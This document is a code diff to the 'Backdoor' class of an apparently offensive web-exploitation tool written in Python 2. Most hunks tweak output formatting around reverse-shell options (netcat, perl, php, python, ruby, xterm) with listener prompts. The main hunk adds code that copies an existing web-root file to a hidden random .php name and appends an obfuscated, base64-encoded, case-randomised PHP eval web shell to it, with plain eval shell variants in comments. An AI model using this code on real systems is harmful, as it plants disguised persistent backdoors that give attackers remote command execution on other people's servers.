@@ -69,7 +69,7 @@ class Backdoor(object):
             print '\n{0}[i] Found netcat!'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in netcat:
-                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
             raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in netcat:
@@ -86,7 +86,7 @@ class Backdoor(object):
             print '\n{0}[i] Found perl!'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in perl:
-                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
             raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in perl:
@@ -111,20 +111,36 @@ class Backdoor(object):
             print '\n{0}[+] Found a writable directory: \'{1}\'{2}'.format(Colors.GREEN, folder, Colors.END)
             filename = '.'+''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))+'.php'     # Ths could be put into a function? Snap! (<--with msf)
             print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
-            path = '{0}/{1}'.format(folder, filename)
+            location = '{0}/{1}'.format(folder, filename)
             
-            print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, path, Colors.END)
+            cmd = 'find {0} -type f -print'.format(wwwroot)
+            files=make_request.get_page_source(cmd)
+            print '{0}[i] Select a file to \'clone\' (or \'0\' to skip):{1}'.format(Colors.GREEN, Colors.END)
+            print '{0} 0.) Don\'t close - create new{1}'.format(Colors.GREEN, Colors.END)
+            path = []
+            c = 0
+            for file in files:
+                path.append(file)
+                c += 1
+                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, file, Colors.END)
+            
+            clone=raw_input('{0}[>]: {1}'.format(Colors.GREEN, Colors.END))
+            if clone is not "0":
+                cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
+                make_request.get_page_source(cmd)
+                
+            print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, location, Colors.END)
             parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
-            #  1) cmd = 'echo "<?php @eval(\$_GET[\'cmd\'].\';\'); ?>" > "{0}"'.format(path)        # 'Standard' with fix parameter
-            #2.1) payload = 'echo "@eval(\$_GET[\'{0}\'].\';\');" | base64'.format(parameter)       # 'Standard with random parameter
-            #2.2) cmd = 'echo "<?php eval(base64_decode("{0}" ?>" > "{1}"'.format(payload, path)    
-            import base64, itertools                                                                # 'Encoded with random parameter and alting cases
+            #  1) cmd = 'echo "<?php @eval(\$_GET[\'cmd\'].\';\'); ?>" > "{0}"'.format(location)
+            #2.1) payload = 'echo "@eval(\$_GET[\'{0}\'].\';\');" | base64'.format(parameter)
+            #2.2) cmd = 'echo "<?php eval(base64_decode("{0}" ?>" > "{1}"'.format(payload, location)    
+            import base64, itertools
             casePayload=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'eval'))))
             caseShell=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
             payload = "{0}($_GET['{1}'].';');".format(casePayload, parameter)
             payloadEncoded = base64.b64encode(payload).format(payload)
             evilFile= "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
-            cmd = 'echo \'{0}\' > \"{1}\"'.format(evilFile, path)
+            cmd = 'echo \'{0}\' >> \"{1}\"'.format(evilFile, location)
             make_request.get_page_source(cmd)
             
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
@@ -141,7 +157,7 @@ class Backdoor(object):
             print '\n{0}[i] Found php-cli!'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in php:
-                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
             raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in php:
@@ -160,7 +176,7 @@ class Backdoor(object):
             print '\n{0}[i] Found python!'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in python:
-                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
             raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in python:
@@ -184,7 +200,7 @@ class Backdoor(object):
             print '\n{0}[i] Found ruby!'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in ruby:
-                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
             raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in ruby:
@@ -220,7 +236,7 @@ class Backdoor(object):
             print '\n{0}[i] Found xterm!'.format(Colors.GREEN, Colors.END)
             c = 1
             for path in xterm:
-                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
             raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in xterm:
